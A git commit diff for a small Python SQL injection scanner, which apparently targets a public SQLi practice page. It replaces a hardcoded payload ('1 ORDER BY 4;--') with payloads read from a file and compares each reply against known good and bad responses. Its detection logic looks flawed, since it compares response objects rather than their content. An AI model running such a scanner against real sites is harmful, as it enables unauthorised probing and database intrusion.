8caaed591fd705de99c426e7fe0ade1620f6683a
KhalVissi <vodz4r@gmail.com>
2022-03-11 16:49:28 +0100

    Update SQL1nt3ll1g3nce.py

--- SQL1nt3ll1g3nce.py
+++ SQL1nt3ll1g3nce.py
@@ -1,6 +1,12 @@
 import urllib.parse
 import requests
 
+def LoadPayloads():
+    file = open('sqli_payloads.txt', 'rb')
+    payloads = file.readlines()
+    file.close()
+    return payloads
+
 url = 'https://www.zixem.altervista.org/SQLi/level1.php'
 parameter = 'id'
 correct_value = '1'
@@ -9,10 +15,11 @@ incorrect_value = 'dzadhazoiud'
 correct_response = requests.get(f'{url}?{parameter}={correct_value}')
 incorrect_response = requests.get(f'{url}?{parameter}={incorrect_value}')
 
-payloads = ['1 ORDER BY 4;--']
+payloads = LoadPayloads()
 
 for payload in payloads:
     encoded_payload = urllib.parse.quote(payload)
+    payload = payload.decode("utf-8").replace('\n','')
     payload_response = requests.get(f'{url}?{parameter}={encoded_payload}')
     if payload_response != correct_response and payload_response != incorrect_response:
-        print(f'Parameter "{parameter}" might be injectable with payload : "{payload}" (URL encoded : {encoded_payload}). ({payload_response.status_code})')
+        print(f'Parameter {parameter} might be injectable with payload : {payload}')
